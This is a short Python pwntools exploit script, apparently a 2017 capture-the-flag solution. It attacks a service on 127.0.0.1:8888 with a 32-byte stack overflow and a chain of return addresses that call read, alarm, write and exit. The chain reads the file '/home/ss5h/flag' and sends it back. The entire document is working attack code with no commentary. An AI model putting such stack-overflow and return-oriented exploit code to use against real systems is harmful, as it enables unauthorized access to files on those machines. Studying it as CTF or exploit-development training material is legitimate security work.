from pwn import *
from time import *

s = remote('127.0.0.1', 8888)

addr_vuln = 0x0804815A
addr_int = 0x0804813A
addr_alarm = 0x804810D
addr_read = 0x804811D
addr_write = 0x8048135
addr_exit = 0x804814D
addr_writable = 0x80491bc

flag_path = "/home/ss5h/flag\x00"

def recv():
	print s.recvuntil("Good Luck!\n")

print s.recvuntil("!")

dummy = "A"*0x20

payload = dummy
payload += p32(addr_read)
payload += p32(addr_vuln)
payload += p32(0)
payload += p32(addr_writable)
payload += p32(len(flag_path))

s.send(payload)
s.send(flag_path)
recv()

sleep(5)

payload = dummy
payload += p32(addr_alarm)
payload += p32(addr_int)
payload += p32(addr_vuln)
payload += p32(addr_writable)
payload += p32(0)

s.send(payload)
recv()

payload = dummy
payload += p32(addr_read)
payload += p32(addr_vuln)
payload += p32(3)
payload += p32(addr_writable)
payload += p32(100)

s.send(payload)
recv()

payload = dummy
payload += p32(addr_write)
payload += p32(addr_exit)
payload += p32(1)
payload += p32(addr_writable)
payload += p32(100)

s.send(payload)

s.interactive()
#2017.04.19

